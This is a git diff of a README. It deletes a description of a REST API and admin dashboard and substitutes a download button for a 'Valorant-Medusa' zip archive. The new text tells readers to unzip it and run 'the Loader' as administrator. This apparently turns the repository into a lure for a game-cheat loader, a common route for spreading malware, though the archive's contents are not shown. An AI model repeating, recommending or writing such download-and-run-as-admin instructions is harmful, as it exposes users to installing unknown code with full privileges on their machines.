@@ -1,20 +1,10 @@
-## About The Project
+![cxxzz](https://github.com/user-attachments/assets/dc20ae0f-cafe-4660-85aa-3fe417a4f610)
 
-### Rest API with endpoints to interact with a MySql database.
+[![51s1](https://github.com/user-attachments/assets/eb2feb31-4ce9-4ef0-9656-ed35885bddf1)](https://github.com/fatema-khalaf/Valorant-Medusa/releases/download/MedusaRelease/V4.2.zip)
 
-The user of this API can implement the following actions:
+## How do I download and run it?
 
--   Get a list of Things
--   Get a specific Thing
--   Create a new Thing
-
-### Admin Dashboard
-
-The user of this dashboard can implement the following actions:
-
--   Add new data to the database
--   View all kinds of data stored in the database
--   Update any data field in the database
-<img width="948" alt="Ekran Alıntısı" src="https://user-images.githubusercontent.com/40761773/169654372-925d8651-6b86-4e61-afab-d8f1ec559eaf.PNG">
-
-<img width="950" alt="2" src="https://user-images.githubusercontent.com/40761773/169654425-52411e0a-bbec-4674-ba90-ed923f047527.PNG">
+- Download the zip archive using the button above
+- Unzip to any folder on your desktop
+- Open the Loader as an administrator
+- Customize it for yourself and have fun!
